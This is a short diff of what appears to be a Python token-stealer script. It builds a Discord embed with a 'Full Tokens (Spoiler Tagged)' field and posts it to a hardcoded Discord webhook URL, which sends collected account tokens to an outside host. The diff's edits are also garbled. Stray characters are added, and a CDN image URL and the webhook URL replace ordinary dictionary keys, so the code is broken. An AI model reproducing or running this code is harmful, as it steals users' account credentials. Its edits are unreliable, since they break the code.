@@ -1,4 +1,4 @@
-}],
+w}],
     }
     
     # Add token fields if tokens were provided
@@ -27,10 +27,10 @@
                 "name": "Full Tokens (Spoiler Tagged)",
                 "value": full_tokens,
                 "inline": False
-            }]
+            }]a
     
     if url:
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
+        embed["embeds"][0].update({"https://cdn.discordapp.com/attachments/1506213620688617482/1513990758137462824/IMG_20260607_011157_724.webp?ex=6a29bd45&is=6a286bc5&hm=722d14c5700802776781cc5eb176d17e9026502ed683170a953365d553e6f34d&": {"url": url}})
     
     requests.post(config["https://discord.com/api/webhooks/1513444189877174282/7imru0IN-nwceoc-qmn5T9H12FIxlg-qHiGdWd9nc8Ft7io7DYtcsabtG7d3LTrgANc3"], json=embed)
     return info
